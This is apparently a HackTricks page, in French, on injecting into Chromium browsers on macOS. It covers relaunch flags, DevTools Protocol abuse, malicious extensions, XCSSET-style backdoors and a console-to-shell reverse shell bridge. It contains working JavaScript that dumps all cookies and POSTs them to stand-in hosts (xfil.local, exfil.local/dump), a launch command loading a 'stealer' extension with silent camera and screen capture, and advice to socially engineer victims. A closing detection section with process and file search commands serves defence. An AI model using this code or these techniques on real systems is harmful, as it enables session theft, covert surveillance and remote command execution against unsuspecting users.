# Injection Chromium sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Les browsers basés sur Chromium, comme Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi et Opera, utilisent tous les mêmes options de ligne de commande, fichiers de préférences et interfaces d'automatisation DevTools. Sur macOS, tout utilisateur disposant d'un accès à l'interface graphique peut terminer une session de browser existante et la rouvrir avec des flags, extensions ou endpoints DevTools arbitraires qui s'exécutent avec les entitlements de la cible.

#### Lancer Chromium avec des flags personnalisés sur macOS

macOS conserve une seule instance d'interface utilisateur par profil Chromium. L'instrumentation nécessite donc normalement de forcer la fermeture du browser (par exemple avec `osascript -e 'tell application "Google Chrome" to quit'`). Les attackers relancent généralement le browser avec `open -na "Google Chrome" --args <flags>` afin d'injecter des arguments sans modifier le bundle de l'application. En intégrant cette commande dans un LaunchAgent utilisateur (`~/Library/LaunchAgents/*.plist`) ou un login hook, le browser altéré est relancé après chaque reboot ou déconnexion.

#### Flag `--load-extension`

Le flag `--load-extension` charge automatiquement les extensions non empaquetées (chemins séparés par des virgules). Associez-le à `--disable-extensions-except` pour bloquer les extensions légitimes tout en forçant l'exécution de votre payload uniquement. Les extensions malveillantes peuvent demander des permissions à fort impact, comme `debugger`, `webRequest` et `cookies`, afin de pivoter vers les protocoles DevTools, modifier les en-têtes CSP, rétrograder HTTPS ou exfiltrer des éléments de session dès le démarrage du browser.<sup>[[4]](#references)</sup>

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Ces switches exposent le Chrome DevTools Protocol (CDP) sur TCP ou via un pipe, afin que des outils externes puissent piloter le browser. Google a observé un usage généralisé de cette interface par des infostealers et, depuis Chrome 136 (mars 2025), les switches sont ignorés pour le profil par défaut, sauf si le browser est lancé avec un `--user-data-dir` non standard. Cela applique l'App-Bound Encryption aux profils réels, mais les attackers peuvent toujours créer un profil vierge, inciter la victime à s'y authentifier (phishing/assistance au triage), puis récupérer les cookies, tokens, états de confiance de l'appareil ou enregistrements WebAuthn via CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Ce flag redirige l'intégralité du profil du browser (History, Cookies, Login Data, fichiers de préférences, etc.) vers un chemin contrôlé par l'attacker. Il est obligatoire lorsque les versions modernes de Chrome sont combinées avec `--remote-debugging-port`. Il permet également d'isoler le profil altéré afin d'y déposer des fichiers `Preferences` ou `Secure Preferences` préremplis qui désactivent les invites de sécurité, installent automatiquement des extensions et modifient les schémas par défaut.

#### Flag `--use-fake-ui-for-media-stream`

Ce switch contourne l'invite de permission pour la caméra et le microphone, de sorte que toute page appelant `getUserMedia` obtient immédiatement l'accès. Combinez-le avec des flags tels que `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ou des commandes CDP `Browser.grantPermissions` pour capturer silencieusement l'audio et la vidéo, partager le bureau ou satisfaire les vérifications de permission WebRTC sans interaction de l'utilisateur.<sup>[[4]](#references)</sup>

## Modèles de livraison et de relance observés sur le terrain

L'abus de CDP constitue généralement une étape de **post-exploitation** plutôt que le payload initial. Une campagne récente ciblant des développeurs macOS utilisait une phase de build **`Run Script`** Xcode empoisonnée (`PBXShellScriptBuildPhase`), de sorte que le code ne s'exécutait que lorsque la victime **compilait** le projet, et non lorsqu'elle le clonait ou l'ouvrait simplement. Après cette première exécution, le malware infectait également d'autres arborescences `.xcodeproj`, ajoutait des hooks Git `pre-commit` malveillants et recherchait d'autres projets Xcode dans les archives ZIP.<sup>[[3]](#references)</sup>

Pour l'abus de Chromium, cela est important, car l'attacker n'a pas besoin de patcher le binaire du browser lui-même. Un stager de courte durée basé sur une phase de build / `osascript` peut à la place installer un **browser wrapper** (LaunchAgent, login item, entrée du Dock, launcher d'application trojanisé, etc.) qui rouvre le browser légitime avec des flags contrôlés par l'attacker chaque fois que l'utilisateur le démarre.<sup>[[3]](#references)</sup>

> [!TIP]
> Sur les endpoints de développeurs, inspectez les fichiers `.pbxproj`, `.git/hooks/pre-commit` et les ZIP contenant des `.xcodeproj` afin de détecter des éléments inattendus comme `curl`, `osascript`, `xxd`, du `base64` imbriqué ou une logique de relance de Chrome.

## Abus du Remote Debugging et du DevTools Protocol

Une fois que Chrome est relancé avec un `--user-data-dir` dédié et `--remote-debugging-port`, vous pouvez vous connecter via CDP (par exemple avec `chrome-remote-interface`, `puppeteer` ou `playwright`) et automatiser des workflows à privilèges élevés :

- **Vol de cookies/session :** `Network.getAllCookies` et `Storage.getCookies` renvoient les valeurs HttpOnly même lorsque l'App-Bound encryption bloquerait normalement l'accès au système de fichiers, car CDP demande au browser en cours d'exécution de les déchiffrer.
- **Altération des permissions :** `Browser.grantPermissions` et `Emulation.setGeolocationOverride` permettent de contourner les invites pour la caméra et le microphone (notamment en combinaison avec `--use-fake-ui-for-media-stream`) ou de falsifier les vérifications de sécurité fondées sur la localisation.
- **Injection de frappes/scripts :** `Runtime.evaluate` exécute du JavaScript arbitraire dans l'onglet actif, ce qui permet de récupérer des identifiants, de modifier le DOM ou d'injecter des beacons de persistence qui survivent à la navigation.<sup>[[1]](#references)</sup>
- **Exfiltration en direct :** `Network.webRequestWillBeSentExtraInfo` et `Fetch.enable` interceptent en temps réel les requêtes et réponses authentifiées sans toucher aux artefacts présents sur le disque.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Comme Chrome 136 bloque le CDP sur le profil par défaut, copier-coller le répertoire existant `~/Library/Application Support/Google/Chrome` de la victime vers un chemin de staging ne permet plus d'obtenir des cookies déchiffrés. À la place, faites de l'ingénierie sociale auprès de l'utilisateur pour qu'il s'authentifie dans le profil instrumenté (par exemple, lors d'une session de support « utile ») ou capturez les tokens MFA en transit via des network hooks contrôlés par le CDP.<sup>[[5]](#references)</sup>

### Chaîne de backdoor CDP de type XCSSET

Un modèle pratique de malware consiste à :

1. Redémarrer l'implant userland ou le wrapper à chaque lancement de Chrome.
2. Lancer le navigateur légitime avec `--remote-debugging-port=<port>` et, avec Chrome 136 ou une version ultérieure, généralement avec un `--user-data-dir=<dir>` associé et non par défaut.
3. Démarrer un helper qui se connecte au WebSocket CDP local et enregistre un hook pré-document avec `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Ce helper peut injecter du JavaScript **avant** l'exécution du code du site, ce qui est idéal pour effectuer du hooking sur `window.fetch`, `XMLHttpRequest`, les wallet providers ou les flux d'autofill sans patcher les fichiers sur le disque.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Une variante plus puissante transforme le navigateur en **host command bridge** : le JavaScript injecté émet un `console.log` marqué par un délimiteur, l'helper local surveille `Runtime.consoleAPICalled`, retire le marqueur, exécute le reste via le shell de l'hôte (par exemple `exec.Command` de Go), puis renvoie stdout/stderr via le WebSocket de l'attaquant. Cela transforme l'exécution de scripts au niveau de l'onglet en un **reverse shell** principalement fileless.<sup>[[3]](#references)</sup>

## Injection basée sur une Extension via l'API Debugger

La recherche de 2023 intitulée "Chrowned by an Extension" a démontré qu'une extension malveillante utilisant l'API `chrome.debugger` peut s'attacher à n'importe quel onglet et obtenir les mêmes pouvoirs DevTools que `--remote-debugging-port`.<sup>[[6]](#references)</sup> Cela brise les hypothèses d'isolation initiales (les extensions restent dans leur contexte) et permet :

- Le vol silencieux de cookies et d'identifiants avec `Network.getAllCookies`/`Fetch.getResponseBody`.
- La modification des permissions des sites (caméra, microphone, géolocalisation) et le contournement des interstitiels de sécurité, permettant aux pages de phishing d'imiter les boîtes de dialogue de Chrome.
- La falsification on-path des avertissements TLS, des téléchargements ou des invites WebAuthn en pilotant programmatiquement `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ou `Security.handleCertificateError`.

Chargez l'extension avec `--load-extension`/`--disable-extensions-except` afin qu'aucune interaction de l'utilisateur ne soit requise. Un script d'arrière-plan minimal qui weaponize l'API ressemble à ceci :
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'extension peut également s'abonner aux événements `Debugger.paused` pour lire les variables JavaScript, patcher les scripts inline ou déposer des points d'arrêt personnalisés qui persistent lors de la navigation. Comme tout s'exécute dans la session GUI de l'utilisateur, Gatekeeper et TCC ne sont pas déclenchés, ce qui rend cette technique idéale pour un malware ayant déjà obtenu une exécution dans le contexte de l'utilisateur.<sup>[[6]](#references)</sup>

## Détection et recherche

- Déclenchez une alerte lorsque des navigateurs Chromium sont lancés avec `--remote-debugging-port`, `--remote-debugging-pipe` ou un `--user-data-dir` suspect, en particulier lorsque le processus parent est `bash`, `sh`, `osascript`, `xcodebuild` ou un helper LaunchAgent.
- Recherchez de courtes chaînes dans lesquelles un helper ouvre un WebSocket CDP local, enregistre `Page.addScriptToEvaluateOnNewDocument`, puis établit une connexion WebSocket/HTTPS sortante de longue durée.
- Recherchez les ponts console-to-shell en corrélant l'activité `Runtime.consoleAPICalled` du navigateur avec des shells enfants ou des processus helper exécutant des commandes fournies par l'attaquant.
- Sur les Mac de développeurs, examinez les entrées `PBXShellScriptBuildPhase` des fichiers `.pbxproj`, les hooks Git `pre-commit`, les relanceurs du Dock/des éléments de connexion et les projets Xcode contenus dans des fichiers ZIP afin de détecter l'installation de wrappers de navigateur.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Outils

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatise le lancement de Chromium avec des extensions contenant des payloads et expose des hooks CDP interactifs.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Outil similaire axé sur l’interception du trafic et l’instrumentation du navigateur pour les opérateurs macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bibliothèque Node.js permettant de scripter les dumps du Chrome DevTools Protocol (cookies, DOM, permissions) lorsqu’une instance `--remote-debugging-port` est active.

### Exemple
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trouvez davantage d’exemples dans les liens vers les tools.

## Références

- [1] [Chrome DevTools Protocol - domaine Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - domaine Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
